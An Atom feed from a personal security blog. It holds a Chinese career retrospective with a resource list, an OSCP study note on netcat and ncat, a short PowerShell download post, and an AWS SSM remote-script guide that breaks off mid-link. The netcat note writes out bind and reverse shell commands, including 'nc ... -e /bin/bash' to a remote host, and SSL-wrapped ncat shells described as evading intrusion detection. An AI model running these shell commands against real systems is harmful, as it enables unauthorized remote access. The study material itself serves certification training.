<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TonghuaRoot&#39;s BloG. - Cyber security enthusiast, not Hacker.</title>
  
  <subtitle>Know it, then Hack it!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://tonghuaroot.com/"/>
  <updated>2019-10-08T15:51:33.132Z</updated>
  <id>https://tonghuaroot.com/</id>
  
  <author>
    <name>TonghuaRoot</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一个信息安全从业人员的自我修养——我的安全技术栈</title>
    <link href="https://tonghuaroot.com/2019/10/07/My-security-technology-stack/"/>
    <id>https://tonghuaroot.com/2019/10/07/My-security-technology-stack/</id>
    <published>2019-10-07T00:19:49.000Z</published>
    <updated>2019-10-08T15:51:33.132Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>曾经很长一段时间一直被一件事情困扰着，就是学过的新技术被闲置一段时间之后，当再捡起来时有种无从下手的感觉。很多技术点都被遗忘了，虽然自己一直有整理笔记的习惯，但奈何越来越多琐碎的一坨坨知识点放在云笔记上再去检索也是一个难题。并且有的笔记没有发出来就有一种懈怠的感觉，随随便便写下，当再次翻看的时候又无从下手了。</p><p>基于以上的问题，既然遗忘是无法避免的，倒不如把之前研究的东西、学习资料以及未来想学习的东西分享出来，形成一个近似标准化的文档，一来是避免遗忘，形成真正有价值的『学习笔记』，当自己真正需要一些东西的时候，方便快速定位到具体目标。二来是也算是分享一下目前的状态，如果能遇到同类，那还是极好的。</p><p>当然，文档中的内容只是我的一家之言，如果你有任何不同的观点也欢迎讨论。</p><h2 id="0x01-我的信息安全学习之路"><a href="#0x01-我的信息安全学习之路" class="headerlink" title="0x01 我的信息安全学习之路"></a>0x01 我的信息安全学习之路</h2><p>踏入安全行业，我是从渗透测试开始的，更准确的说是从『工具小子』开始。</p><ul><li>08年第一次接触信息安全，使用的第一个安全工具是『啊D注入工具』，百度搜索<code>asp?id=``、SQL注入、</code>xp_cmdshel<code>、</code>net user<code>`</code>加账号、3389上去一把梭，好不快活。而后接触了越来越多Windows下各类图形化的安全工具（信息收集、端口扫描、SSQL注入、打包好的exploit工具、提权、权限维持、端口转发等等），接触了Linux，学习Linux上头的各种命令行工具。整体的学习方式都是需求驱动的野路子，比如说我SQL注入拿了一个站，登上去发现 ipconfig 不好使了，我才知道这个世界上除了Windows还有Linux这种操作系统的存在。当然这个阶段也是野蛮生长的阶段，加了各种安全团队QQ群，各种安全社区林立（还有很多用屏幕共享专家录的视频教程，我就是看的这些视频入门的，啊哈哈哈。当然至于在08年还在读初中的我是怎么接触这个圈子的，那就是另外一个故事了。）</li><li>时间久了，靠着别人写的工具抓鸡拿站也没啥意思。那会好多论坛里也在讨论一个观点就是说『一个不懂编程的人是永远不可能成为一个好黑客的』，asp再那段时间逐渐开始谢幕，越来越多的站点都开始使用LAMP这种解决方案，充其量再来个站库分离，内网是没有ACL划分的，没有现在这种安全产品（firewall、IDS那些就是个摆设，当然现在很多企业买来了设备之后也都是处于吃灰的状态，不过至少大环境跟以前是完全不一样的。）拿到了webshell基本上内网就都是你的了。也是在这个时候开始接触了PHP，能不能代码审计出SQL注入，就看研发有没有用intval()了，框架级、体系化的代码审计漏洞挖掘是不存在的，基本就是看别人怎么挖，我也就跟着怎么挖的状态。</li><li>时间来到了2014年，习大大第一次提出了“没有网络安全就没有国家安全，没有信息化就没有现代化。”大型互联网公司的信息安全团队愈发壮大，政府机构开始对信息安全愈发的重视，也提出了更高的要求。而我也正式步入大学的校园，开始我的大学生活。系统的学习计算机基础知识算是这4年的主旋律。</li><li>当然野路子出身的我肯定是不能满足这种两点一线按部就班的生存状态的，2015年来到北京开始了我的第一份实习工作——在永信的技术研究实验室做『渗透』，也是这份工作让我真正的见识到了一个优秀的渗透团队是如何协作的，每一个真正的渗透师是如何各种手段完成自己的工作。这段时间的成长对我来说是飞快地，技术、眼界，也是这一次的实习让我真正的踏入了信息安全行业。至于说具体做了哪些工作，那是绝对不能讲的，总之和那种搞等保拿扫描器扫扫出报告是不一样的。</li><li>后来我就去了360，前后经历了攻防实验室、信息安全部。攻防实验室那会做国内外安全研究paper的监控、安全事件安全漏洞预警，让我见识到了安全领域不仅仅是渗透测试，Web安全、移动安全、社会工程、系统安全、网络安全、AI安全（后面会重点说）、安全开发、威胁情报、甲方企业安全建设、安全运营、红蓝对抗、各类企业级的安全产品甚至安全合规等等，只能说国内外工业界各类前沿的安全技术在这里是都有机会接触到的（说来惭愧，没能在一个方向上做到dive deep），也是这段工作经历让我有机会接触到了各类的信息安全从业人员，让我对信息安全行业全局观有了一定的了解。信息安全部（Okee Team）做的是甲方企业企业安全建设以及对外输出安全能力，这段工作经历让我有机会接触到了大型互联网企业是如何做安全的，各种安全技术、安全产品是如何落地安全建设，也是这段工作经历让我真正懂得了『纵深防御』、『木桶原理』，没有漏洞，不会被黑客入侵是可望不可及的终极目标。尽可能的减少高中危漏洞、安全事件异常行为监控告警、安全事件的及时响应、事后复盘优化流程才是甲方安全建设的主旋律。</li><li>现在我在做云安全，同时也在探索机器学习算法为安全建设做一些锦上添花的小事。</li></ul><h2 id="0x02-安全技术栈"><a href="#0x02-安全技术栈" class="headerlink" title="0x02 安全技术栈"></a>0x02 安全技术栈</h2><p>啰嗦了这么多，接下来才是本文的重点，我会在这一节，把我学过的东西、准备学的东西、自己输出的学习笔记、整理的学习资料做一个分享。一共分为以下几个部分：</p><ul><li>Penetration test</li><li>Data-driven Security</li><li>Cloud Security</li><li>Security R&amp;D</li><li>计算机基础</li></ul><h3 id="Penetration-test"><a href="#Penetration-test" class="headerlink" title="Penetration test"></a>Penetration test</h3><h4 id="安全工具"><a href="#安全工具" class="headerlink" title="安全工具"></a>安全工具</h4><p>sqlmap、msf这些就先不往上写了，之后可能会加进来。</p><ul><li><a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">xray 安全评估工具</a>：被动扫描刷SRC神器</li><li><a href="https://gobies.org" target="_blank" rel="noopener">Goby:Attack surface mapping</a></li></ul><h4 id="OSCP"><a href="#OSCP" class="headerlink" title="OSCP"></a>OSCP</h4><p>国外很多企业招渗透测试工程师都很看重这个认证，国内也越来越重视了。考试费用800+，除了可以在lab上练习之外，报名前可以在下面的平台上练手。</p><ul><li>HacktheBox</li></ul><h3 id="Data-driven-Security"><a href="#Data-driven-Security" class="headerlink" title="Data-driven Security"></a>Data-driven Security</h3><h4 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h4><ul><li><a href="http://4o4notfound.org/" target="_blank" rel="noopener">404 Not Found’Blog</a></li></ul><h4 id="书"><a href="#书" class="headerlink" title="书"></a>书</h4><ul><li>《机器学习》</li><li>《机器学习实战》</li><li>《动手深度学习》</li><li>《深度学习》</li></ul><h4 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h4><ul><li>公众号【深度之眼】：会发一些上面经典机器学习教材方面的视频教程（很便宜，其实想学习的话获取各类知识真的是很廉价的啊）</li><li>吴恩达机器学习：网易课堂上有中文字幕的版本</li><li>沐神的《动手深度学习》：mxnet为基础录得一套视频</li><li>伯克利有一套深度学习的课在youtube上可以翻到（拿《动手深度学习》这本书做教材）</li><li>台大李宏毅的机器学习</li></ul><h3 id="Cloud-Security"><a href="#Cloud-Security" class="headerlink" title="Cloud Security"></a>Cloud Security</h3><ul><li>AWS 安全产品文档及白皮书（IAM/KMS/Security Hub/GuardDuty等等）</li></ul><h3 id="Security-R-amp-D"><a href="#Security-R-amp-D" class="headerlink" title="Security R&amp;D"></a>Security R&amp;D</h3><h4 id="书-1"><a href="#书-1" class="headerlink" title="书"></a>书</h4><ul><li>《Go语言实战》</li></ul><h4 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h4><ul><li><a href="https://www.bilibili.com/video/av51984570" target="_blank" rel="noopener">Golang</a></li></ul><h3 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h3><h2 id="书-2"><a href="#书-2" class="headerlink" title="书"></a>书</h2><ul><li>《深入理解计算机系统》</li></ul><h2 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h2><ul><li><a href="https://mp.weixin.qq.com/s/_2CPFLW3Oft3bpsdjZe7Hg" target="_blank" rel="noopener">相声：CPU和内存是怎么一起“鬼混”的</a></li></ul><h2 id="0X03-安全站点收集"><a href="#0X03-安全站点收集" class="headerlink" title="0X03 安全站点收集"></a>0X03 安全站点收集</h2><p>把我经常逛的站点分享一下，还有很多RSS源一些国内外安全研究人员、安全公司、安全媒体一类的，等之后整理一下再传上来。</p><h3 id="国内"><a href="#国内" class="headerlink" title="国内"></a>国内</h3><ul><li><a href="https://www.anquanke.com/" target="_blank" rel="noopener">安全客</a>：老东家，放在第一位了。</li><li><a href="https://paper.seebug.org/" target="_blank" rel="noopener">Paper</a></li><li><a href="https://www.sec-wiki.com/" target="_blank" rel="noopener">SecWiki</a></li><li><a href="https://xz.aliyun.com/" target="_blank" rel="noopener">阿里先知</a></li><li><a href="https://www.4hou.com/" target="_blank" rel="noopener">嘶吼</a></li><li><a href="http://www.91ri.org/" target="_blank" rel="noopener">91Ri</a></li><li><a href="https://www.freebuf.com/" target="_blank" rel="noopener">Freebuf</a></li></ul><h3 id="国外"><a href="#国外" class="headerlink" title="国外"></a>国外</h3><ul><li><a href="https://www.reddit.com/r/netsec/new" target="_blank" rel="noopener">netsec</a></li></ul><h3 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h3><ul><li>安全学术圈</li></ul><h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 结语"></a>0x04 结语</h2><p>上述为本人一之言，欢迎讨论，如果你有更好的想法、资源，也欢迎贡献。</p><h2 id="0x05-Timeline"><a href="#0x05-Timeline" class="headerlink" title="0x05 Timeline"></a>0x05 Timeline</h2><ul><li>2019.10.07 写了这篇文章，并初步分享一些资料，之后整理了还会逐渐再发上来。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;曾经很长一段时间一直被一件事情困扰着，就是学过的新技术被闲置一段时间之后，当再捡起来时有种无从下手的
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>OSCP Note - Common use of Netcat(nc) and Ncat</title>
    <link href="https://tonghuaroot.com/2019/06/18/OSCP-Note-Common-use-of-Netcat-nc-and-Ncat/"/>
    <id>https://tonghuaroot.com/2019/06/18/OSCP-Note-Common-use-of-Netcat-nc-and-Ncat/</id>
    <published>2019-06-18T23:57:25.000Z</published>
    <updated>2019-06-19T08:34:09.566Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>The article records some ways to use nc.</p><ul><li>Determine if the target port is open</li><li>Connecting to a TCP/UDP Port</li><li>Listening on a TCP/UDP Port</li><li>Transferring Files with Netcat</li><li>Remote Administration with Netcat</li><li>Ncat:more security’s nc</li></ul><h2 id="0x01-Determine-if-the-target-port-is-open"><a href="#0x01-Determine-if-the-target-port-is-open" class="headerlink" title="0x01 Determine if the target port is open"></a>0x01 Determine if the target port is open</h2><ul><li>Port open</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -vz 10.0.0.64 22</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 10.0.0.64:22.</span><br><span class="line">Ncat: 0 bytes sent, 0 bytes received in 0.53 seconds.</span><br></pre></td></tr></table></figure><ul><li>Port close</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -vz 10.0.0.64 23</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connection refused.</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure><h2 id="0x02-Connecting-to-a-TCP-UDP-Port"><a href="#0x02-Connecting-to-a-TCP-UDP-Port" class="headerlink" title="0x02 Connecting to a TCP/UDP Port"></a>0x02 Connecting to a TCP/UDP Port</h2><p>Useful:</p><ul><li>check port is open or closed</li><li>read a banner</li><li>To connect to a network service manually</li></ul><p>example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -nv 10.0.0.64 22</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 10.0.0.64:22.</span><br><span class="line">SSH-2.0-OpenSSH_7.4</span><br><span class="line"></span><br><span class="line">Protocol mismatch.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ncat: Broken pipe.</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure><h2 id="0x03-Listening-on-a-TCP-UDP-Port"><a href="#0x03-Listening-on-a-TCP-UDP-Port" class="headerlink" title="0x03 Listening on a TCP/UDP Port"></a>0x03 Listening on a TCP/UDP Port</h2><p>Useful:</p><ul><li>network debugging client applications</li><li>otherwise receiving a TCP/UDP network connection</li></ul><p>Server side listen TCP port 4444:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -nvlp 4444</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br></pre></td></tr></table></figure><p>Use netstat can see TCP port 4444 is open.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ sudo netstat -nltp | grep 4444</span><br><span class="line">tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      7427/nc</span><br><span class="line">tcp6       0      0 :::4444                 :::*                    LISTEN      7427/nc</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure></p><p>Clienr side can connect this TCP port and chat with server side.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ nc -nv 10.0.0.64 4444</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 10.0.0.64:4444.</span><br><span class="line">aaaa</span><br><span class="line">aaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure></p><h2 id="0x04-Transferring-Files-with-Netcat"><a href="#0x04-Transferring-Files-with-Netcat" class="headerlink" title="0x04 Transferring Files with Netcat"></a>0x04 Transferring Files with Netcat</h2><p>Note the Windows Firewall configuration.<br>Text and binary file all support.</p><p>Server side(Target machine):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\netcat-win32-1.12&gt;nc64.exe -nlvp 4444 &gt; wget.exe</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.0.0.39] from (UNKNOWN) [52.80.67.xxx] 59980</span><br></pre></td></tr></table></figure></p><p>Client side:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 temp]$ nc -nv 54.222.196.xxx 4444 &lt; wget.exe</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 54.222.196.xxx:4444.</span><br><span class="line">Ncat: 308736 bytes sent, 0 bytes received in 0.62 seconds.</span><br></pre></td></tr></table></figure></p><h2 id="0x05-Remote-Administration-with-Netcat"><a href="#0x05-Remote-Administration-with-Netcat" class="headerlink" title="0x05 Remote Administration with Netcat"></a>0x05 Remote Administration with Netcat</h2><p>Netcat can take an executable file and redirect the input(stdin), output(stdout), and error messages(stderr) to a TCP/UDP port rather than the default console.</p><h3 id="nc-Bind-Shell"><a href="#nc-Bind-Shell" class="headerlink" title="nc Bind Shell"></a>nc Bind Shell</h3><p>Service side(Windows):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\netcat-win32-1.12&gt;nc -nlvp 4444 -e cmd.exe</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.0.0.39] from (UNKNOWN) [52.80.67.111] 60420</span><br></pre></td></tr></table></figure></p><p>Linux can use this command bind shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 4444 -e /bin/bash</span><br></pre></td></tr></table></figure></p><p>client side:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 temp]$ nc -nv 54.222.196.xxx 4444</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 54.222.196.xxx:4444.</span><br><span class="line">Microsoft Windows [▒汾 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation▒▒▒▒▒▒▒▒▒▒Ȩ▒▒</span><br><span class="line"></span><br><span class="line">D:\netcat-win32-1.12&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">ec2amaz-okar8bt\administrator</span><br><span class="line"></span><br><span class="line">D:\netcat-win32-1.12&gt;</span><br></pre></td></tr></table></figure></p><h3 id="nc-Reverse-Shell"><a href="#nc-Reverse-Shell" class="headerlink" title="nc Reverse Shell"></a>nc Reverse Shell</h3><p>Service side:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\netcat-win32-1.12&gt;nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure></p><p>Client side:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 temp]$ nc -nv 54.222.196.xxx 4444 -e /bin/bash</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connected to 54.222.196.xxx:4444.</span><br></pre></td></tr></table></figure></p><p>Then you can execute command in this reverse shell, like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:\netcat-win32-1.12&gt;nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.0.0.39] from (UNKNOWN) [52.80.67.111] 40908</span><br><span class="line">id</span><br><span class="line">uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal)</span><br></pre></td></tr></table></figure></p><h2 id="0x06-Ncat-more-security’s-nc"><a href="#0x06-Ncat-more-security’s-nc" class="headerlink" title="0x06 Ncat:more security’s nc"></a>0x06 Ncat:more security’s nc</h2><ul><li>Encryption of the bind or reverse shell will aid the penetration tester in avoiding intrusion detection systems</li><li>Not expose the penetrated machines to unwanted IP addresses.</li></ul><p>Server side:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 temp]$ ncat --exec /bin/bash --allow 54.222.196.xxx -vnl 4444 --ssl</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.</span><br><span class="line">Ncat: SHA-1 fingerprint: C900 5192 97CA 45E9 0B30 DB8E D76A D8D3 2673 3BF3</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 54.222.196.xxx.</span><br><span class="line">Ncat: Connection from 54.222.196.xxx:63540.</span><br></pre></td></tr></table></figure><p>Client side:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\NcatPortable-master\NcatPortable-master&gt;ncat -v 52.80.67.xxx 4444 --ssl</span><br><span class="line">Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )</span><br><span class="line">Ncat: SSL connection to 52.80.67.xxx:4444.</span><br><span class="line">Ncat: SHA-1 fingerprint: C900 5192 97CA 45E9 0B30 DB8E D76A D8D3 2673 3BF3</span><br><span class="line">id</span><br><span class="line">uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal)</span><br></pre></td></tr></table></figure></p><p>Then you can execute command in this bind shell.</p><h2 id="0x07-Command-summary"><a href="#0x07-Command-summary" class="headerlink" title="0x07 Command summary"></a>0x07 Command summary</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nc -vz 10.0.0.64 22</span><br><span class="line">nc -nv 10.0.0.64 22</span><br><span class="line">nc -nvlp 4444</span><br><span class="line">nc64.exe -nlvp 4444 &gt; wget.exe</span><br><span class="line">nc -nv 54.222.196.xxx 4444 &lt; wget.exe</span><br><span class="line">nc -nlvp 4444 -e cmd.exe</span><br><span class="line">nc -nlvp 4444 -e /bin/bash</span><br><span class="line">nc -nv 54.222.196.xxx 4444 -e /bin/bash</span><br><span class="line">ncat --exec /bin/bash --allow 54.222.196.xxx -vnl 4444 --ssl</span><br><span class="line">ncat -v 52.80.67.xxx 4444 --ssl</span><br></pre></td></tr></table></figure><h2 id="0x08-Reference"><a href="#0x08-Reference" class="headerlink" title="0x08 Reference"></a>0x08 Reference</h2><ul><li><a href="https://en.wikipedia.org/wiki/Netcat" target="_blank" rel="noopener">netcat</a></li><li><a href="http://netcat.sourceforge.net/" target="_blank" rel="noopener">The GNU Netcat project</a></li><li><a href="http://nmap.org/ncat/" target="_blank" rel="noopener">Ncat</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;The article records some ways to use n
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>A command similar to wget in Windows: Invoke-WebRequest</title>
    <link href="https://tonghuaroot.com/2019/05/29/A-command-similar-to-wget-in-Windows-Invoke-WebRequest/"/>
    <id>https://tonghuaroot.com/2019/05/29/A-command-similar-to-wget-in-Windows-Invoke-WebRequest/</id>
    <published>2019-05-29T00:40:20.000Z</published>
    <updated>2019-05-29T09:15:19.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>Linux can use wget command to download files. In this article, we will introduce the powershell command for Windows download files: Invoke-WebRequesit.</p><h2 id="0x01-Invoke-WebRequest-Demo"><a href="#0x01-Invoke-WebRequest-Demo" class="headerlink" title="0x01 Invoke-WebRequest Demo"></a>0x01 Invoke-WebRequest Demo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest http://52.80.67.123:8000/get-process.ps1 -OutFile c:\get-process.ps1</span><br></pre></td></tr></table></figure><h2 id="0x02-Reference"><a href="#0x02-Reference" class="headerlink" title="0x02 Reference"></a>0x02 Reference</h2><ul><li><a href="https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1" target="_blank" rel="noopener">Invoke-WebRequest</a></li><li><a href="https://www.pstips.net/cat/powershell-%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8B" target="_blank" rel="noopener">PowerShell Guide(Video)</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;Linux can use wget command to download
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Use AWS SSM(Systems Manager) execute remote script file at EC2 instance</title>
    <link href="https://tonghuaroot.com/2019/05/28/Use-AWS-SSM-Systems-Manager-execute-remote-script-file-at-EC2-instance/"/>
    <id>https://tonghuaroot.com/2019/05/28/Use-AWS-SSM-Systems-Manager-execute-remote-script-file-at-EC2-instance/</id>
    <published>2019-05-28T02:45:16.000Z</published>
    <updated>2019-05-29T08:43:03.796Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>This article documents how to use AWS SSM to execute remote script files at EC2 instances.<br>There are two general methods:<br>1.Running Scripts from GitHub and Amazon S3<br>2.First upload the file to EC2 through SSM, and then use SSM to execute the command to run the uploaded script.</p><h2 id="0x01-Running-Scripts-from-GitHub"><a href="#0x01-Running-Scripts-from-GitHub" class="headerlink" title="0x01 Running Scripts from GitHub"></a>0x01 Running Scripts from GitHub</h2><p>Use the following AWS Cli command<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ssm send-command --document-name &quot;AWS-RunRemoteScript&quot; --instance-ids &quot;i-0d781805630c8edc0&quot; --parameters &apos;&#123;&quot;sourceType&quot;:[&quot;GitHub&quot;],&quot;sourceInfo&quot;:[&quot;&#123;\&quot;owner\&quot;:\&quot;omg2hei\&quot;, \&quot;repository\&quot;:\&quot;PowerShellDemo\&quot;, \&quot;path\&quot;: \&quot;/\&quot;&#125;&quot;],&quot;commandLine&quot;:[&quot;get-process.ps1&quot;]&#125;&apos;</span><br></pre></td></tr></table></figure></p><p>Then EC2 instance(Windows Server 2016) will be execute get-process.ps1.</p><h2 id="0x02-First-upload-the-file-to-EC2-through-SSM-and-then-use-SSM-to-execute-the-command-to-run-the-uploaded-script"><a href="#0x02-First-upload-the-file-to-EC2-through-SSM-and-then-use-SSM-to-execute-the-command-to-run-the-uploaded-script" class="headerlink" title="0x02 First upload the file to EC2 through SSM, and then use SSM to execute the command to run the uploaded script"></a>0x02 First upload the file to EC2 through SSM, and then use SSM to execute the command to run the uploaded script</h2><p>Step 1.Upload file to EC2 use SSM<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ssm send-command --document-name &quot;AWS-RunPowerShellScript&quot; --parameters commands=&quot;Invoke-WebRequest http://52.80.67.123:8000/get-process.ps1 -OutFile c:\get-process.ps1&quot; --instance-ids i-0d781805630c8edc0 --document-version &quot;\$DEFAULT&quot;</span><br></pre></td></tr></table></figure></p><p>Step 2.use SSM to execute the command to run the uploaded script<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ssm send-command --document-name &quot;AWS-RunPowerShellScript&quot; --parameters commands=&quot;c:\get-process.ps1&quot; --instance-ids i-0d781805630c8edc0 --document-version &quot;\$DEFAULT&quot;</span><br></pre></td></tr></table></figure></p><h2 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h2><p>[1] Running Scripts from GitHub and Amazon S3  - <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/integration-remote-scripts.html" 